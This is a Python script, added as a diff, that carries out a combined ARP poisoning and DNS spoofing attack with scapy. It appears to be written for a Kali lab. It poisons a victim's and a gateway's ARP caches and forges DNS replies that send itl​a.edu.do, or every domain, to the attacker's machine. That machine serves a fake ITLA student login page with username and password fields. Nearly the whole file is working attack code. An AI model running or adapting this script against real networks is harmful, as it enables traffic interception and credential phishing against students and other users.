@@ -1,0 +1,232 @@
+#!/usr/bin/env python3
+
+from scapy.all import ARP, Ether, DNS, DNSRR, IP, UDP, srp, send, sniff
+import threading
+import http.server
+import socketserver
+import time
+import sys
+import os
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 dns_spoofing.py")
+        sys.exit(1)
+
+
+PAGINA_FALSA = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ITLA - Instituto Tecnologico de las Americas</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #003580;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .contenedor {
+            text-align: center;
+            padding: 40px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            width: 400px;
+        }
+        h1 { font-size: 28px; margin-bottom: 8px; }
+        p  { font-size: 14px; opacity: 0.8; margin-bottom: 24px; }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #e8a000;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .alerta {
+            margin-top: 20px;
+            background: #cc0000;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="contenedor">
+        <h1>ITLA</h1>
+        <h1>Instituto Tecnologico de las Americas</h1>
+        <p>Portal Estudiantil — Inicia sesion para continuar</p>
+        <input type="text" placeholder="Usuario o matricula" />
+        <input type="password" placeholder="Contrasena" />
+        <button>Iniciar Sesion</button>
+        <div class="alerta">SITIO INTERCEPTADO POR KALI</div>
+    </div>
+</body>
+</html>"""
+
+
+class ServidorFalso(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(PAGINA_FALSA.encode())
+
+    def log_message(self, format, *args):
+        print(f"[HTTP] Victima conectada desde {self.client_address[0]}")
+
+
+def iniciar_servidor_web(puerto):
+    try:
+        with socketserver.TCPServer(("", puerto), ServidorFalso) as httpd:
+            print(f"[+] Servidor web falso activo en puerto {puerto}")
+            httpd.serve_forever()
+    except Exception as e:
+        print(f"[!] Error servidor web: {e}")
+
+
+def obtener_mac(ip, interfaz):
+    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    respuestas, _ = srp(solicitud, iface=interfaz, timeout=3, verbose=False)
+    if respuestas:
+        return respuestas[0][1].hwsrc
+    return None
+
+
+def arp_poison(ip_victima, mac_victima, ip_gateway, mac_gateway, interfaz):
+    print("[+] ARP Poisoning iniciado...")
+    while True:
+        send(ARP(op=2, pdst=ip_victima, hwdst=mac_victima, psrc=ip_gateway),
+             iface=interfaz, verbose=False)
+        send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victima),
+             iface=interfaz, verbose=False)
+        time.sleep(2)
+
+
+def dns_spoof(pkt, ip_kali, dominios):
+    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
+        return
+
+    dominio = pkt[DNS].qd.qname.decode()
+
+    if dominios and dominio not in dominios:
+        return
+
+    print(f"[*] DNS interceptado: {pkt[IP].src} → {dominio}")
+
+    respuesta = (
+        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
+        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
+        DNS(
+            id=pkt[DNS].id,
+            qr=1, aa=1, rd=1, ra=1,
+            qd=pkt[DNS].qd,
+            an=DNSRR(
+                rrname=pkt[DNS].qd.qname,
+                type="A",
+                ttl=10,
+                rdata=ip_kali
+            )
+        )
+    )
+
+    send(respuesta, iface=pkt.sniffed_on, verbose=False)
+    print(f"[!] Redirigido: {dominio} → {ip_kali}")
+
+
+def menu():
+    print("=" * 55)
+    print("   ATAQUE DNS SPOOFING + ARP POISONING")
+    print("=" * 55)
+    print()
+
+    interfaz   = input("[?] Interfaz de red (ej: eth0)      : ").strip() or "eth0"
+    ip_victima = input("[?] IP de la victima                : ").strip()
+    ip_gateway = input("[?] IP del gateway/router           : ").strip()
+    ip_kali    = input("[?] IP de Kali (servidor falso)     : ").strip()
+
+    print()
+    print("[*] Dominios a redirigir:")
+    print("    1. Solo itla.edu.do")
+    print("    2. Todos los dominios")
+
+    while True:
+        op = input("\n[?] Selecciona (1 o 2): ").strip()
+        if op == "1":
+            dominios = ["itla.edu.do.", "www.itla.edu.do."]
+            break
+        elif op == "2":
+            dominios = []
+            break
+        print("[!] Opcion invalida.")
+
+    return interfaz, ip_victima, ip_gateway, ip_kali, dominios
+
+
+def main():
+    verificar_root()
+    interfaz, ip_victima, ip_gateway, ip_kali, dominios = menu()
+
+    print(f"\n[*] Obteniendo MAC de la victima ({ip_victima})...")
+    mac_victima = obtener_mac(ip_victima, interfaz)
+    if not mac_victima:
+        print(f"[!] No se pudo obtener la MAC de {ip_victima}.")
+        sys.exit(1)
+
+    print(f"[*] Obteniendo MAC del gateway ({ip_gateway})...")
+    mac_gateway = obtener_mac(ip_gateway, interfaz)
+    if not mac_gateway:
+        print(f"[!] No se pudo obtener la MAC de {ip_gateway}.")
+        sys.exit(1)
+
+    print(f"\n[+] MAC Victima : {mac_victima}")
+    print(f"[+] MAC Gateway : {mac_gateway}")
+
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("[+] IP Forwarding activado")
+
+    t_web = threading.Thread(
+        target=iniciar_servidor_web, args=(80,), daemon=True)
+    t_web.start()
+
+    t_arp = threading.Thread(
+        target=arp_poison,
+        args=(ip_victima, mac_victima, ip_gateway, mac_gateway, interfaz),
+        daemon=True)
+    t_arp.start()
+
+    print(f"[+] Esperando consultas DNS...\n")
+
+    try:
+        sniff(
+            iface=interfaz,
+            filter="udp port 53",
+            prn=lambda pkt: dns_spoof(pkt, ip_kali, dominios),
+            store=False
+        )
+    except KeyboardInterrupt:
+        print("\n[*] Ataque detenido.")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
